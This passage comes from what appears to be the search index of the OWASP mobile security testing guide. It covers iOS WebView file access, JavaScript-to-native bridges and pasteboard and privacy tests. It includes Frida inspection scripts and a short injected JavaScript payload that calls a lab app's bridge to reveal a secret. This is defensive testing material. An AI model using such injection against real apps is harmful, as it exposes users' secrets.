false\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-5","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/","title":"MASTG-TEST-0077: Testing WebView Protocol Handlers","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0077: Testing WebView Protocol Handlers (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/#static-analysis","title":"Static Analysis","text":"<ul> <li>Testing How WebViews Load Content</li> <li>Testing WebView file access</li> <li>Checking telephone number detection</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/#testing-how-webviews-load-content","title":"Testing How WebViews Load Content","text":"<p>If a WebView is loading content from the app data directory, users should not be able to change the filename or path from which the file is loaded, and they shouldn't be able to edit the loaded file.</p> <p>This presents an issue especially in <code>UIWebView</code>s loading untrusted content via the deprecated methods <code>loadHTMLString:baseURL:</code> or <code>loadData:MIMEType:textEncodingName:baseURL:</code> and setting the <code>baseURL</code> parameter to <code>nil</code> or to a <code>file:</code> or <code>applewebdata:</code> URL schemes. In this case, in order to prevent unauthorized access to local files, the best option is to set it instead to <code>about:blank</code>. However, the recommendation is to avoid the use of <code>UIWebView</code>s and switch to <code>WKWebView</code>s instead.</p> <p>Here's an example of a vulnerable <code>UIWebView</code> from \"Where's My Browser?\":</p> <pre><code>let scenario2HtmlPath = Bundle.main.url(forResource: \"web/UIWebView/scenario2.html\", withExtension: nil)\ndo {\n    let scenario2Html = try String(contentsOf: scenario2HtmlPath!, encoding: .utf8)\n    uiWebView.loadHTMLString(scenario2Html, baseURL: nil)\n} catch {}\n</code></pre> <p>The page loads resources from the internet using HTTP, enabling a potential MITM to exfiltrate secrets contained in local files, e.g. in shared preferences.</p> <p>When working with <code>WKWebView</code>s, Apple recommends using <code>loadHTMLString:baseURL:</code> or <code>loadData:MIMEType:textEncodingName:baseURL:</code> to load local HTML files and <code>loadRequest:</code> for web content. Typically, the local files are loaded in combination with methods including, among others: <code>pathForResource:ofType:</code>, <code>URLForResource:withExtension:</code> or <code>init(contentsOf:encoding:)</code>.</p> <p>Search the source code for the mentioned methods and inspect their parameters.</p> <p>Example in Objective-C:</p> <pre><code>- (void)viewDidLoad\n{\n    [super viewDidLoad];\n    WKWebViewConfiguration *configuration = [[WKWebViewConfiguration alloc] init];\n\n    self.webView = [[WKWebView alloc] initWithFrame:CGRectMake(10, 20,\n        CGRectGetWidth([UIScreen mainScreen].bounds) - 20,\n        CGRectGetHeight([UIScreen mainScreen].bounds) - 84) configuration:configuration];\n    self.webView.navigationDelegate = self;\n    [self.view addSubview:self.webView];\n\n    NSString *filePath = [[NSBundle mainBundle] pathForResource:@\"example_file\" ofType:@\"html\"];\n    NSString *html = [NSString stringWithContentsOfFile:filePath\n                                encoding:NSUTF8StringEncoding error:nil];\n    [self.webView loadHTMLString:html baseURL:[NSBundle mainBundle].resourceURL];\n}\n</code></pre> <p>Example in Swift from \"Where's My Browser?\":</p> <pre><code>let scenario2HtmlPath = Bundle.main.url(forResource: \"web/WKWebView/scenario2.html\", withExtension: nil)\ndo {\n    let scenario2Html = try String(contentsOf: scenario2HtmlPath!, encoding: .utf8)\n    wkWebView.loadHTMLString(scenario2Html, baseURL: nil)\n} catch {}\n</code></pre> <p>If only having the compiled binary, you can also search for these methods using  rabin2:</p> <pre><code>$ rabin2 -zz ./WheresMyBrowser | grep -i \"loadHTMLString\"\n231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:\n</code></pre> <p>In a case like this, it is recommended to perform dynamic analysis to ensure that this is in fact being used and from which kind of WebView. The <code>baseURL</code> parameter here doesn't present an issue as it will be set to \"null\" but could be an issue if not set properly when using a <code>UIWebView</code>. See \"Checking How WebViews are Loaded\" for an example about this.</p> <p>In addition, you should also verify if the app is using the method <code>loadFileURL: allowingReadAccessToURL:</code>. Its first parameter is <code>URL</code> and contains the URL to be loaded in the WebView, its second parameter <code>allowingReadAccessToURL</code> may contain a single file or a directory. If containing a single file, that file will be available to the WebView. However, if it contains a directory, all files on that directory will be made available to the WebView. Therefore, it is worth inspecting this and in case it is a directory, verifying that no sensitive data can be found inside it.</p> <p>Example in Swift from \"Where's My Browser?\":</p> <pre><code>var scenario1Url = FileManager.default.urls(for: .libraryDirectory, in: .userDomainMask)[0]\nscenario1Url = scenario1Url.appendingPathComponent(\"WKWebView/scenario1.html\")\nwkWebView.loadFileURL(scenario1Url, allowingReadAccessTo: scenario1Url)\n</code></pre> <p>In this case, the parameter <code>allowingReadAccessToURL</code> contains a single file \"WKWebView/scenario1.html\", meaning that the WebView has exclusively access to that file.</p> <p>In the compiled binary you can use  rabin2:</p> <pre><code>$ rabin2 -zz ./WheresMyBrowser | grep -i \"loadFileURL\"\n237 0x0002dff1 37 (4.__TEXT.__objc_methname) ascii loadFileURL:allowingReadAccessToURL:\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/#testing-webview-file-access","title":"Testing WebView File Access","text":"<p>If you have found a <code>UIWebView</code> being used, then the following applies:</p> <ul> <li>The <code>file://</code> scheme is always enabled.</li> <li>File access from <code>file://</code> URLs is always enabled.</li> <li>Universal access from <code>file://</code> URLs is always enabled.</li> </ul> <p>Regarding <code>WKWebView</code>s:</p> <ul> <li>The <code>file://</code> scheme is also always enabled and it cannot be disabled.</li> <li>It disables file access from <code>file://</code> URLs by default but it can be enabled.</li> </ul> <p>The following WebView properties can be used to configure file access:</p> <ul> <li><code>allowFileAccessFromFileURLs</code> (<code>WKPreferences</code>, <code>false</code> by default): it enables JavaScript running in the context of a <code>file://</code> scheme URL to access content from other <code>file://</code> scheme URLs.</li> <li><code>allowUniversalAccessFromFileURLs</code> (<code>WKWebViewConfiguration</code>, <code>false</code> by default): it enables JavaScript running in the context of a <code>file://</code> scheme URL to access content from any origin.</li> </ul> <p>For example, it is possible to set the undocumented property <code>allowFileAccessFromFileURLs</code> by doing this:</p> <p>Objective-C:</p> <pre><code>[webView.configuration.preferences setValue:@YES forKey:@\"allowFileAccessFromFileURLs\"];\n</code></pre> <p>Swift:</p> <pre><code>webView.configuration.preferences.setValue(true, forKey: \"allowFileAccessFromFileURLs\")\n</code></pre> <p>If one or more of the above properties are activated, you should determine whether they are really necessary for the app to work properly.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/#checking-telephone-number-detection","title":"Checking Telephone Number Detection","text":"<p>In Safari on iOS, telephone number detection is on by default. However, you might want to turn it off if your HTML page contains numbers that can be interpreted as phone numbers, but are not phone numbers, or to prevent the DOM document from being modified when parsed by the browser. To turn off telephone number detection in Safari on iOS, use the format-detection meta tag (<code>&lt;meta name = \"format-detection\" content = \"telephone=no\"&gt;</code>). An example of this can be found in the Apple developer documentation. Phone links should be then used (e.g. <code>&lt;a href=\"tel:1-408-555-5555\"&gt;1-408-555-5555&lt;/a&gt;</code>) to explicitly create a link.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>If it's possible to load local files via a WebView, the app might be vulnerable to directory traversal attacks. This would allow access to all files within the sandbox or even to escape the sandbox with full access to the file system (if the device is jailbroken). It should therefore be verified if a user can change the filename or path from which the file is loaded, and they shouldn't be able to edit the loaded file.</p> <p>To simulate an attack, you may inject your own JavaScript into the WebView with an interception proxy or simply by using dynamic instrumentation. Attempt to access local storage and any native methods and properties that might be exposed to the JavaScript context.</p> <p>In a real-world scenario, JavaScript can only be injected through a permanent backend Cross-Site Scripting vulnerability or a MITM attack. See the OWASP XSS Prevention Cheat Sheet and the chapter \"iOS Network Communication\" for more information.</p> <p>For what concerns this section we will learn about:</p> <ul> <li>Testing How WebViews Load Content</li> <li>Determining WebView file access</li> </ul>","tags":["ios","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/#testing-how-webviews-load-content_1","title":"Testing How WebViews Load Content","text":"<p>If <code>WKWebView</code>'s \"scenario 2\" of the \"Where's My Browser?\" app is loaded, the app will do so by calling <code>URLForResource:withExtension:</code> and <code>loadHTMLString:baseURL</code>.</p> <p>To quickly inspect this, you can use frida-trace and trace all <code>loadHTMLString</code> and <code>URLForResource:withExtension:</code> methods.</p> <pre><code>$ frida-trace -U \"Where's My Browser?\"\n    -m \"*[WKWebView *loadHTMLString*]\" -m \"*[* URLForResource:withExtension:]\"\n\n 14131 ms  -[NSBundle URLForResource:0x1c0255390 withExtension:0x0]\n 14131 ms  URLForResource: web/WKWebView/scenario2.html\n 14131 ms  withExtension: 0x0\n 14190 ms  -[WKWebView loadHTMLString:0x1c0255390 baseURL:0x0]\n 14190 ms   HTMLString: &lt;!DOCTYPE html&gt;\n    &lt;html&gt;\n        ...\n        &lt;/html&gt;\n\n 14190 ms  baseURL: nil\n</code></pre> <p>In this case, <code>baseURL</code> is set to <code>nil</code>, meaning that the effective origin is \"null\". You can obtain the effective origin by running <code>window.origin</code> from the JavaScript of the page (this app has an exploitation helper that allows to write and run JavaScript, but you could also implement a MITM or simply use Frida to inject JavaScript, e.g. via <code>evaluateJavaScript:completionHandler</code> of <code>WKWebView</code>).</p> <p>As an additional note regarding <code>UIWebView</code>s, if you retrieve the effective origin from a <code>UIWebView</code> where <code>baseURL</code> is also set to <code>nil</code> you will see that it is not set to \"null\", instead you'll obtain something similar to the following:</p> <pre><code>applewebdata://5361016c-f4a0-4305-816b-65411fc1d780\n</code></pre> <p>This origin \"applewebdata://\" is similar to the \"file://\" origin as it does not implement Same-Origin Policy and allow access to local files and any web resources. In this case, it would be better to set <code>baseURL</code> to \"about:blank\", this way, the Same-Origin Policy would prevent cross-origin access. However, the recommendation here is to completely avoid using <code>UIWebView</code>s and go for <code>WKWebView</code>s instead.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/#determining-webview-file-access","title":"Determining WebView File Access","text":"<p>Even if not having the original source code, you can quickly determine if the app's WebViews do allow file access and which kind. For this, simply navigate to the target WebView in the app and inspect all its instances, for each of them get the values mentioned in the static analysis, that is, <code>allowFileAccessFromFileURLs</code> and <code>allowUniversalAccessFromFileURLs</code>. This only applies to <code>WKWebView</code>s (<code>UIWebVIew</code>s always allow file access).</p> <p>We continue with our example using the \"Where's My Browser?\" app and Frida REPL, extend the script with the following content:</p> <pre><code>ObjC.choose(ObjC.classes['WKWebView'], {\n  onMatch: function (wk) {\n    console.log('onMatch: ', wk);\n    console.log('URL: ', wk.URL().toString());\n    console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());\n    console.log('allowFileAccessFromFileURLs: ',\n            wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());\n    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());\n    console.log('allowUniversalAccessFromFileURLs: ',\n            wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());\n  },\n  onComplete: function () {\n    console.log('done for WKWebView!');\n  }\n});\n</code></pre> <p>If you run it now, you'll have all the information you need:</p> <pre><code>$ frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js\n\nonMatch:  &lt;WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = &lt;CALayer: 0x1c4238f20&gt;&gt;\nURL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/\n        Library/WKWebView/scenario1.html\njavaScriptEnabled:  true\nallowFileAccessFromFileURLs:  0\nhasOnlySecureContent:  false\nallowUniversalAccessFromFileURLs:  0\n</code></pre> <p>Both <code>allowFileAccessFromFileURLs</code> and <code>allowUniversalAccessFromFileURLs</code> are set to \"0\", meaning that they are disabled. In this app we can go to the WebView configuration and enable <code>allowFileAccessFromFileURLs</code>. If we do so and re-run the script we will see how it is set to \"1\" this time:</p> <pre><code>$ frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js\n...\n\nallowFileAccessFromFileURLs:  1\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-6","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0078/","title":"MASTG-TEST-0078: Determining Whether Native Methods Are Exposed Through WebViews","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0078: Determining Whether Native Methods Are Exposed Through WebViews (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-7","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0078/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-7","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0078/#static-analysis","title":"Static Analysis","text":"","tags":["ios","L1","L2","test","MSTG-PLATFORM-7","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0078/#testing-uiwebview-javascript-to-native-bridges","title":"Testing UIWebView JavaScript to Native Bridges","text":"<p>Search for code that maps native objects to the <code>JSContext</code> associated with a WebView and analyze what functionality it exposes, for example no sensitive data should be accessible and exposed to WebViews.</p> <p>In Objective-C, the <code>JSContext</code> associated with a <code>UIWebView</code> is obtained as follows:</p> <pre><code>[webView valueForKeyPath:@\"documentView.webView.mainFrame.javaScriptContext\"]\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-7","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0078/#testing-wkwebview-javascript-to-native-bridges","title":"Testing WKWebView JavaScript to Native Bridges","text":"<p>Verify if a JavaScript to native bridge exists by searching for <code>WKScriptMessageHandler</code> and check all exposed methods. Then verify how the methods are called.</p> <p>The following example from \"Where's My Browser?\" demonstrates this.</p> <p>First we see how the JavaScript bridge is enabled:</p> <pre><code>func enableJavaScriptBridge(_ enabled: Bool) {\n    options_dict[\"javaScriptBridge\"]?.value = enabled\n    let userContentController = wkWebViewConfiguration.userContentController\n    userContentController.removeScriptMessageHandler(forName: \"javaScriptBridge\")\n\n    if enabled {\n            let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()\n            userContentController.add(javaScriptBridgeMessageHandler, name: \"javaScriptBridge\")\n    }\n}\n</code></pre> <p>Adding a script message handler with name <code>\"name\"</code> (or <code>\"javaScriptBridge\"</code> in the example above) causes the JavaScript function <code>window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage</code> to be defined in all frames in all web views that use the user content controller. It can be then used from the HTML file like this:</p> <pre><code>function invokeNativeOperation() {\n    value1 = document.getElementById(\"value1\").value\n    value2 = document.getElementById(\"value2\").value\n    window.webkit.messageHandlers.javaScriptBridge.postMessage([\"multiplyNumbers\", value1, value2]);\n}\n</code></pre> <p>The called function resides in <code>JavaScriptBridgeMessageHandler.swift</code>:</p> <pre><code>class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {\n\n//...\n\ncase \"multiplyNumbers\":\n\n        let arg1 = Double(messageArray[1])!\n        let arg2 = Double(messageArray[2])!\n        result = String(arg1 * arg2)\n//...\n\nlet javaScriptCallBack = \"javascriptBridgeCallBack('\\(functionFromJS)','\\(result)')\"\nmessage.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)\n</code></pre> <p>The problem here is that the <code>JavaScriptBridgeMessageHandler</code> not only contains that function, it also exposes a sensitive function:</p> <pre><code>case \"getSecret\":\n        result = \"XSRSOGKC342\"\n</code></pre>","tags":["ios","L1","L2","test","MSTG-PLATFORM-7","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0078/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>At this point you've surely identified all potentially interesting WebViews in the iOS app and got an overview of the potential attack surface (via static analysis, the dynamic analysis techniques that we have seen in previous sections or a combination of them). This would include HTML and JavaScript files, usage of the <code>JSContext</code> / <code>JSExport</code> for <code>UIWebView</code> and <code>WKScriptMessageHandler</code> for <code>WKWebView</code>, as well as which functions are exposed and present in a WebView.</p> <p>Further dynamic analysis can help you exploit those functions and get sensitive data that they might be exposing. As we have seen in the static analysis, in the previous example it was trivial to get the secret value by performing reverse engineering (the secret value was found in plain text inside the source code) but imagine that the exposed function retrieves the secret from secure storage. In this case, only dynamic analysis and exploitation would help.</p> <p>The procedure for exploiting the functions starts with producing a JavaScript payload and injecting it into the file that the app is requesting. The injection can be accomplished via various techniques, for example:</p> <ul> <li>If some of the content is loaded insecurely from the Internet over HTTP (mixed content), you can try to implement a MITM attack.</li> <li>You can always perform dynamic instrumentation and inject the JavaScript payload by using frameworks like Frida and the corresponding JavaScript evaluation functions available for the iOS WebViews (<code>stringByEvaluatingJavaScriptFromString:</code> for <code>UIWebView</code> and <code>evaluateJavaScript:completionHandler:</code> for <code>WKWebView</code>).</li> </ul> <p>In order to get the secret from the previous example of the \"Where's My Browser?\" app, you can use one of these techniques to inject the following payload that will reveal the secret by writing it to the \"result\" field of the WebView:</p> <pre><code>function javascriptBridgeCallBack(name, value) {\n    document.getElementById(\"result\").innerHTML=value;\n};\nwindow.webkit.messageHandlers.javaScriptBridge.postMessage([\"getSecret\"]);\n</code></pre> <p>Of course, you may also use the Exploitation Helper it provides:</p> <p></p> <p>See another example for a vulnerable iOS app and function that is exposed to a WebView in [#thiel2] page 156.</p>","tags":["ios","L1","L2","test","MSTG-PLATFORM-7","masvs-platform-2"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0276/","title":"MASTG-TEST-0276: Use of the iOS General Pasteboard","text":"","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0276/#overview","title":"Overview","text":"<p>This test checks whether the app uses the systemwide general pasteboard, which is persistent across device restarts and app uninstalls and is accessible by all foreground apps and, in some cases, other devices. Placing sensitive data here may pose a privacy risk.</p> <p>The test statically analyzes the code for use of the general pasteboard (<code>UIPasteboard.general</code>) and checks whether sensitive data is written using any of the following methods:</p> <ul> <li><code>addItems</code></li> <li><code>setItems</code></li> <li><code>setData</code></li> <li><code>setValue</code></li> </ul>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0276/#steps","title":"Steps","text":"<ol> <li>Run a static analysis scan using  radare2 for iOS to detect usage of the general pasteboard.</li> <li>Run a static analysis scan using  radare2 for iOS to detect usage of the pasteboard methods which may be handling sensitive data.</li> </ol>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0276/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0276/#evaluation","title":"Evaluation","text":"<p>The test fails if calls are made to <code>UIPasteboard.generalPasteboard</code> and sensitive data is written to it.</p> <p>Since determining what constitutes sensitive data is context-dependent, it can be difficult to detect statically. To check if sensitive data is being written to the pasteboard using the aforementioned methods, inspect the reported code locations in the reverse-engineered code (see  Reviewing Disassembled Objective-C and Swift Code).</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0277/","title":"MASTG-TEST-0277: Sensitive Data in the iOS General Pasteboard at Runtime","text":"","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0277/#overview","title":"Overview","text":"<p>This test is the dynamic counterpart to  Use of the iOS General Pasteboard.</p> <p>In this case we'll monitor the pasteboard for sensitive data being written to it at runtime. Note that this can be challenging to detect, as it requires the app to be running and the pasteboard to be modified while the test is being executed. You can trigger the pasteboard by manually entering sensitive data into the app, such as passwords or personal information, while the test is running. Or you can do it automatically by using a script that simulates user input or modifies the pasteboard directly.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0277/#steps","title":"Steps","text":"<ol> <li>Monitor the pasteboard for sensitive data using  Monitoring the Pasteboard.</li> <li>Run the app and perform actions that may write sensitive data to the pasteboard, such as copying passwords or personal information.</li> </ol>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0277/#observation","title":"Observation","text":"<p>The output should contain a list of pasteboard items that were written during the test.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0277/#evaluation","title":"Evaluation","text":"<p>The test fails if sensitive data is traced during a write operation to the general pasteboard specifically.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0278/","title":"MASTG-TEST-0278: Pasteboard Contents Not Cleared After Use","text":"","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0278/#overview","title":"Overview","text":"<p>This test checks if the app clears the contents of the general pasteboard when it moves to the background or terminates. If sensitive data is left in the pasteboard, it can be accessed by other apps, leading to potential data leaks.</p> <p>Apps can clear the contents of the general pasteboard by setting <code>UIPasteboard.general.items = []</code> in the appropriate lifecycle methods, such as <code>applicationDidEnterBackground:</code> or <code>applicationWillTerminate:</code>.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0278/#steps","title":"Steps","text":"<ol> <li>Run a static analysis scan using  radare2 for iOS to detect usage of the <code>UIPasteboard.general</code> property.</li> <li>Run a static analysis scan using  radare2 for iOS to detect usage of the <code>UIPasteboard.setItems</code> method.</li> </ol>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0278/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0278/#evaluation","title":"Evaluation","text":"<p>The test fails if the app uses the general pasteboard and does not clear its contents when moving to the background or terminating. Specifically, it should be verified that there are calls to <code>UIPasteboard.setItems</code> with an empty array (<code>[]</code>) in the appropriate lifecycle methods.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0279/","title":"MASTG-TEST-0279: Pasteboard Contents Not Expiring","text":"","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0279/#overview","title":"Overview","text":"<p>This test checks if the app sets an expiration date for the contents of the general pasteboard using the <code>UIPasteboard.setItems(_:options:)</code> method with the <code>UIPasteboard.Options.expirationDate</code> option. If sensitive data is left in the pasteboard without an expiration date, it can be accessed by other apps indefinitely, leading to potential data leaks.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0279/#steps","title":"Steps","text":"<ol> <li>Run a static analysis scan using  radare2 for iOS to detect usage of the <code>UIPasteboard.general</code> property.</li> <li>Run a static analysis scan using  radare2 for iOS to detect usage of the <code>UIPasteboard.setItems(_:options:)</code> method.</li> </ol>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0279/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0279/#evaluation","title":"Evaluation","text":"<p>The test fails if the app uses the general pasteboard without setting an expiration date for its contents. Specifically, ensure that the <code>UIPasteboard.setItems(_:options:)</code> method is called with the <code>UIPasteboard.Options.expirationDate</code> option.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0280/","title":"MASTG-TEST-0280: Pasteboard Contents Not Restricted to Local Device","text":"","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0280/#overview","title":"Overview","text":"<p>This test checks if the app restricts the contents of the general pasteboard to the local device by using the <code>UIPasteboard.setItems(_:options:)</code> method with the <code>UIPasteboard.OptionsKey.localOnly</code> option. If sensitive data is placed in the general pasteboard without this restriction, it can be synced across devices via Universal Clipboard, leading to potential data leaks.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0280/#steps","title":"Steps","text":"<ol> <li>Run a static analysis scan using  radare2 for iOS to detect usage of the <code>UIPasteboard.general</code> property.</li> <li>Run a static analysis scan using  radare2 for iOS to detect usage of the <code>UIPasteboard.setItems(_:options:)</code> method.</li> </ol>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0280/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0280/#evaluation","title":"Evaluation","text":"<p>The test fails if the app uses the general pasteboard without restricting its contents to the local device. Specifically, ensure that the <code>UIPasteboard.setItems(_:options:)</code> method is called with the <code>UIPasteboard.Options.localOnly</code> option.</p>","tags":["ios","L2","test","MASWE-0053"]},{"location":"MASTG/tests/ios/MASVS-PRIVACY/MASTG-TEST-0281/","title":"MASTG-TEST-0281: Undeclared Known Tracking Domains","text":"","tags":["ios","P","test","MASWE-0108"]},{"location":"MASTG/tests/ios/MASVS-PRIVACY/MASTG-TEST-0281/#overview","title":"Overview","text":"<p>This test identifies whether the app properly declares all known tracking domains it may communicate with in the <code>NSPrivacyTrackingDomains</code> section of its Privacy Manifest files.</p> <p>To perform this test, use one or more curated lists of known trackers. These lists include domains and identifiers associated with advertising networks, analytics providers, and user profiling services. They are commonly used in privacy-focused tools and browsers to detect and block tracking behavior.</p> <p>Some example lists:</p> <ul> <li>DuckDuckGo iOS Trackers: Includes domains, matching rules, descriptions, and categories such as \"Action Pixels,\" \"Ad Fraud,\" \"Ad Motivated Tracking,\" and \"Advertising.\"</li> <li>Exodus Privacy Trackers: Includes tracker names, categories (e.g., \"Advertisement,\" \"Analytics,\" \"Profiling\"), descriptions, and detection metadata such as network and code signatures.</li> </ul> <p>These references can be used to match hardcoded or dynamically accessed domains within your app and verify whether appropriate declarations exist in the Privacy Manifest.</p>","tags":["ios","P","test","MASWE-0108"]},{"location":"MASTG/tests/ios/MASVS-PRIVACY/MASTG-TEST-0281/#steps","title":"Steps","text":"<ol> <li>Extract the app's privacy manifest files, including those from third-party SDKs or frameworks using  Retrieving PrivacyInfo.xcprivacy Files.</li> <li>Obtain the list of declared tracking domains from the privacy manifest files using  Analyzing PrivacyInfo.xcprivacy Files.</li> <li>Run a static analysis scan using  radare2 for iOS:<ul> <li>Search for hardcoded references to known tracking domains.</li> <li>Identify code references to well-known tracking libraries.</li> </ul> </li> <li>Perform network analysis with  mitmproxy:<ul> <li>Intercept and log all outbound network traffic.</li> <li>Extract all domain names contacted during runtime.</li> </ul> </li> </ol>","tags":["ios","P","test","MASWE-0108"]},{"location":"MASTG/tests/ios/MASVS-PRIVACY/MASTG-TEST-0281/#observation","title":"Observation","text":"<p>The output should contain:</p> <ul> <li>All extracted privacy manifests from the app.</li> <li>A list of declared tracking domains from the <code>NSPrivacyTrackingDomains</code> key in the manifests (preferably with associated components).</li> <li>A list of all domains contacted during dynamic testing.</li> <li>A list of code matches for known tracking domains or tracking libraries from static analysis.</li> </ul>","tags":["ios","P","test","MASWE-0108"]},{"location":"MASTG/tests/ios/MASVS-PRIVACY/MASTG-TEST-0281/#evaluation","title":"Evaluation","text":"<p>The test fails if any of the following is missing in the privacy manifest files' <code>NSPrivacyTrackingDomains</code> key for the app or any of its components (Frameworks, Plugins, etc.):</p> <ul> <li>Tracking domains contacted by the app at runtime.</li> <li>Tracking domains found in the code.</li> <li>Domains corresponding to tracking SDKs found in the code.</li> </ul>","tags":["ios","P","test","MASWE-0108"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0081/","title":"MASTG-TEST-0081: Making Sure that the App Is Properly Signed","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Usage of Outdated Code Signature Format</li> 